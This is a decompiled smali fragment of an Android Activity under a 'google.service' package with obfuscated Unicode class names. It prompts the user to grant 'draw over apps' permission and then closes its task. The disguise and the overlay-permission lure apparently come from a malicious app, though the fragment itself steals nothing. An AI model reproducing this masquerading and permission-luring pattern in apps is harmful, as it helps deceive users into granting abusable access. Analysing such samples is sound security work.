.class public Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;
.super Landroid/app/Activity;
.source "\u2db1$\u02be\u0999\u02ce\u02c8\u02bf\u0674\u2da8\u3164$\u3164\u03c6\u02ca\u02be\u02bf\u0cf2\u02cb\u3164$\u0cf2\u03c6\ufe76\u0cf24787.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 11
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    const/4 v0, 0x0

    .line 112
    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lgoogle/service/φיʾᴵᵢʿⶨˎㅤˏφˎˉㅤⶨㅤⶱـˋⶱφᵎㅤ4794;->shown:Ljava/lang/Boolean;

    .line 113
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 114
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 117
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    .line 66
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    if-nez p1, :cond_1

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    .line 72
    invoke-virtual {p0}, Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;->finish()V

    goto :goto_0

    :cond_0
    if-nez p2, :cond_1

    .line 75
    invoke-virtual {p0}, Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;->finish()V

    :cond_1
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 16
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 23
    :try_start_0
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    if-lt p1, v0, :cond_1

    .line 24
    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 25
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Enable Draw over apps For : "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const v0, 0x7f09000a

    invoke-virtual {p0, v0}, Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x1

    invoke-static {p0, p1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 27
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/4 v0, 0x0

    .line 28
    invoke-virtual {p0, p1, v0}, Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_0

    .line 32
    :cond_0
    invoke-virtual {p0}, Lgoogle/service/ⶱ$ʾঙˎˈʿٴⶨㅤ$ㅤφˊʾʿೲˋㅤ$ೲφﹶೲ4787;->finish()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method
